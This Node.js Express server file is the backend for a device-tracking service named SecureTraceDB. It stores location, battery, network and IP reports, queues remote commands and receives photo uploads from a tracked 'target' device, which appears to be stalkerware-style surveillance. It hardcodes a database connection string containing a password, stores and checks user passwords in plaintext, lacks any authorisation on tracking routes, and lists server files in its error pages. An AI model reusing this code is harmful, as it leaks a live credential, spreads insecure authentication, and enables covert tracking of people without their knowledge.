const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs'); // NAYA: File system detector
const mongoose = require('mongoose');
require('dotenv').config();

const Location = require('./models/Location');
const User = require('./models/User');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Smart Static Folder
let staticFolder = fs.existsSync(path.join(__dirname, 'public')) ? 'public' : 
                  (fs.existsSync(path.join(__dirname, 'frontend')) ? 'frontend' : '');
if(staticFolder) app.use(express.static(path.join(__dirname, staticFolder)));

// DATABASE CONNECTION
const mongoURI = process.env.MONGO_URI || "mongodb+srv://priyanshurajthakur5634_db_user:6SO3JcNKgDLWjwhm@cluster0.yb3flx7.mongodb.net/SecureTraceDB?retryWrites=true&w=majority"; 
mongoose.connect(mongoURI).then(() => console.log("[+] DATABASE CONNECTED!")).catch(err => console.log("[-] DATABASE FAILED:", err));

// API ROUTES
app.post('/api/register', async (req, res) => {
    try {
        const { username, password, deviceId } = req.body;
        const existingUser = await User.findOne({ username });
        if (existingUser) return res.status(400).json({ success: false, message: "Username already exists!" });
        const newUser = new User({ username, password, deviceId });
        await newUser.save();
        res.json({ success: true, message: "Account created!" });
    } catch (error) { res.status(500).json({ success: false, message: "Error" }); }
});

app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = await User.findOne({ username, password });
        if (user) res.json({ success: true, deviceId: user.deviceId });
        else res.status(401).json({ success: false, message: "Invalid Credentials!" });
    } catch (error) { res.status(500).json({ success: false, message: "Error" }); }
});

app.post('/api/update-location', async (req, res) => {
    try {
        const { deviceId, lat, lng, accuracy, battery, network, ipAddress } = req.body;
        const newLocation = new Location({ deviceId, latitude: lat, longitude: lng, accuracy, battery, network, ipAddress });
        await newLocation.save();
        res.json({ success: true });
    } catch (error) { res.status(500).json({ success: false }); }
});

app.post('/api/get-location', async (req, res) => {
    try {
        const { deviceId } = req.body;
        const latestLocation = await Location.findOne({ deviceId }).sort({ timestamp: -1 });
        if (latestLocation) {
            res.json({
                lat: parseFloat(latestLocation.latitude), lng: parseFloat(latestLocation.longitude),
                accuracy: parseFloat(latestLocation.accuracy), battery: latestLocation.battery || "Unknown",
                network: latestLocation.network || "Unknown", ipAddress: latestLocation.ipAddress || "Detecting...",
                photoUrl: latestLocation.photoUrl || "", status: "LIVE TRACKING ACTIVE"
            });
        } else { res.json({ status: "TARGET OFFLINE" }); }
    } catch (error) { res.status(500).json({ status: "ERROR" }); }
});

app.post('/api/send-command', async (req, res) => {
    try {
        await User.findOneAndUpdate({ deviceId: req.body.deviceId }, { actionCommand: req.body.command });
        res.json({ success: true });
    } catch (err) { res.status(500).json({ success: false }); }
});

app.post('/api/check-command', async (req, res) => {
    try {
        const user = await User.findOne({ deviceId: req.body.deviceId });
        res.json({ command: user ? user.actionCommand : "NONE" });
    } catch (err) { res.status(500).json({ command: "NONE" }); }
});

app.post('/api/upload-photo', async (req, res) => {
    try {
        const { deviceId, photoUrl } = req.body;
        const latest = await Location.findOne({ deviceId }).sort({ timestamp: -1 });
        if (latest) { latest.photoUrl = photoUrl; await latest.save(); }
        await User.findOneAndUpdate({ deviceId }, { actionCommand: "NONE" });
        res.json({ success: true });
    } catch (err) { res.status(500).json({ success: false }); }
});

// 🔥 THE ULTIMATE CATCH-ALL (NO MORE CRASHES)
app.use((req, res) => {
    try {
        let pubPath = path.join(__dirname, 'public');
        if (!fs.existsSync(pubPath)) pubPath = path.join(__dirname, 'frontend');
        
        if (fs.existsSync(pubPath)) {
            let files = fs.readdirSync(pubPath);
            // Capital ya Small case, khud dhundhega
            let indexFile = files.find(f => f.toLowerCase() === 'index.html'); 
            
            if (indexFile) {
                res.sendFile(path.join(pubPath, indexFile));
            } else {
                res.send("<h2>File Missing!</h2><p>Folder mila par HTML nahi mili. Fies: " + files.join(', ') + "</p>");
            }
        } else {
            res.send("<h2>Folder Missing!</h2><p>Root Files: " + fs.readdirSync(__dirname).join(', ') + "</p>");
        }
    } catch (e) {
        res.send("Routing Error: " + e.message);
    }
});

app.listen(PORT, () => console.log(`[+] SYSTEM ONLINE ON PORT ${PORT}`));
